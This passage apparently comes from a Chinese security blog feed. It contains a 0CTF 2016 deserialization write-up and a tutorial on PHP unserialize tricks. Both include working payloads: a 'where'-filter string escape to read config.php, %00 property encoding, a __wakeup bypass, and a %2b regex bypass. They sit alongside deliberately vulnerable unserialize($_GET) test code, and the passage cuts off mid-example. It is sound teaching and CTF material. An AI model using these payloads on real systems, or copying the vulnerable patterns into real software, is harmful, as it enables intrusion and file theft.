class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/4.png" alt=""></p><p>nickname可以使用数组绕过限制</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/5.png" alt=""></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">a:</span><span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"phone"</span>;<span class="string">s:</span><span class="number">12</span>:<span class="string">"133323233434"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"email"</span>;<span class="string">s:</span><span class="number">12</span>:<span class="string">"10000@qq.com"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">a:</span><span class="number">1</span>:&#123;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">15</span>:<span class="string">"aaaaabbbbbccccc"</span>;&#125;<span class="string">s:</span><span class="number">5</span>:<span class="string">"photo"</span>;<span class="string">s:</span><span class="number">39</span>:<span class="string">"upload/f3ccdd27d2000e3f9255a7e3e2c48800"</span>;&#125;</span><br></pre></td></tr></table></figure><p>这是正常的序列化字符串，为了控制phpto的值，我们可以利用nickname来构造我们想要的序列化字符串</p><p>例如这样：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">a:</span><span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"phone"</span>;<span class="string">s:</span><span class="number">12</span>:<span class="string">"133323233434"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"email"</span>;<span class="string">s:</span><span class="number">12</span>:<span class="string">"10000@qq.com"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">a:</span><span class="number">1</span>:&#123;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">15</span>:<span class="string">""</span>;&#125;<span class="string">s:</span><span class="number">5</span>:<span class="string">"photo"</span>;<span class="string">s:</span><span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:39:"</span>upload/f3ccdd27d2000e3f9255a7e3e2c48800<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>这样我们需要输入的nickname就应该包含这一段</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后我们来研究如何使该段字符串逃出双引号的限制</p><p>我们注意到在序列化之后调用了show_profile函数</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/6.png" alt=""></p><p>而该函数存在一个过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中五位的where会被替换成6位的hacker这样序列化字符串就会多出一位，我们可以多输入几个where来达到逃出双引号限制的目的</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/7.png" alt=""></p><p>可以看到我们需要输入34个where</p><p>接着进行利用，将nickname[]的值改为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/8.png" alt=""></p><p>然后访问profile.php</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/9.png" alt=""></p><p>得到了config.php的base64编码，解码即可</p><p><img src="/2019/07/16/0ctf-2016-Unserialize题目分析/10.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目有源码泄露，打开备份文件开始审计，注意到flag在config.php中&lt;/p&gt;
&lt;p&gt;贴上部分需要分析的代码：&lt;/p&gt;
&lt;p&gt;update.php&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>反序列化相关问题注意点</title>
    <link href="https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/"/>
    <id>https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/</id>
    <published>2019-07-14T12:03:48.000Z</published>
    <updated>2019-07-15T00:43:27.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="private与protected问题"><a href="#private与protected问题" class="headerlink" title="private与protected问题"></a>private与protected问题</h1><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p>当类内对象为private属性时，生成序列化字符串后会有一些不同，例如如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">'yemoli'</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">'man'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的序列化字符串如下</p><p><img src="/2019/07/14/反序列化相关问题注意点/1.png" alt=""></p><p>可以看到与public属性时的不同，在这时我们构造序列化字符串时可以使用%00代替两个奇怪的字符</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"Student"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">13</span>:<span class="string">"%00Student%00name"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"yemoli"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"sex"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>验证代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">'Zhangsan'</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">'man'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'str'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/test2.php?str=O:<span class="number">7</span>:<span class="string">"Student"</span>:<span class="number">2</span>:&#123;s:<span class="number">13</span>:<span class="string">"%00Student%00name"</span>;s:<span class="number">6</span>:<span class="string">"yemoli"</span>;s:<span class="number">3</span>:<span class="string">"sex"</span>;s:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>result：</p><p><img src="/2019/07/14/反序列化相关问题注意点/2.png" alt=""></p><h2 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h2><p>使用如下代码生成序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">'yemoli'</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">'man'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看一下生成的序列化代码</p><p><img src="/2019/07/14/反序列化相关问题注意点/3.png" alt=""></p><p>这时会发现在protected属性时还会生成一个*，同样的把不可见字符替换为%00即可</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"Student"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"%00*%00name"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"yemoli"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"sex"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>验证代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">'Zhangsan'</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">'man'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'str'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/test2.php?str=O:<span class="number">7</span>:<span class="string">"Student"</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">"%00*%00name"</span>;s:<span class="number">6</span>:<span class="string">"yemoli"</span>;s:<span class="number">3</span>:<span class="string">"sex"</span>;s:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>result:</p><p><img src="/2019/07/14/反序列化相关问题注意点/4.png" alt=""></p><h1 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h1><p>经测试该方法仅适用于php5.5及以下版本</p><p>生成代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">'yemoli'</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">'man'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常生成的是这样的</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"Student"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"%00*%00name"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"yemoli"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"sex"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>想要绕过wakeup函数我们需要使student后的数值大于现在的数值例如将2改为3</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"Student"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"%00*%00name"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"yemoli"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"sex"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>验证代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">'Zhangsan'</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">'man'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">' __wake is working'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'I am:'</span> . <span class="keyword">$this</span>-&gt;name = <span class="string">'zhangsan'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'str'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/test2.php?str=O:<span class="number">7</span>:<span class="string">"Student"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"%00*%00name"</span>;s:<span class="number">6</span>:<span class="string">"yemoli"</span>;s:<span class="number">3</span>:<span class="string">"sex"</span>;s:<span class="number">3</span>:<span class="string">"man"</span>;&#125;</span><br></pre></td></tr></table></figure><p>成功的绕过了__wakeup()</p><p><img src="/2019/07/14/反序列化相关问题注意点/5.png" alt=""></p><h1 id="使用-绕过"><a href="#使用-绕过" class="headerlink" title="使用+绕过"></a>使用+绕过</h1><p>该方法在PHP5.6.24版本已被修复</p><p>有如下题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./test3.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意这里</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg<span class="constructor">_match('<span class="operator">/</span>[<span class="params">oc</span>]:\<span class="params">d</span>+:<span class="operator">/</span><span class="params">i</span>',$<span class="params">data</span>,$<span class="params">matches</span>)</span>;</span><br></pre></td></tr></table></figure><p>正常编写利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file= <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"baby"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>为了绕过正则，在fuzz后发现可以使用加号进行绕过，但注意需要URL编码一下，因为在某些时候+直接使用会被当成空格来处理</p><p>payload：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="symbol">%</span><span class="number">2b4</span>:<span class="string">"baby"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/07/14/反序列化相关问题注意点/6.png" alt=""></p><h1 id="session的反序列化"><a href="#session的反序列化" class="headerlink" title="session的反序列化"></a>session的反序列化</h1><p>PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样就可能存在反序列化漏洞</p><p>首先了解一下session三种序列化的方式</p><p><img src="/2019/07/14/反序列化相关问题注意点/7.png" alt=""></p><p>然后我们以jarvisoj上一道题目为例：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><p>题目存在index和phpinfo两个页面</p><p>index:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span 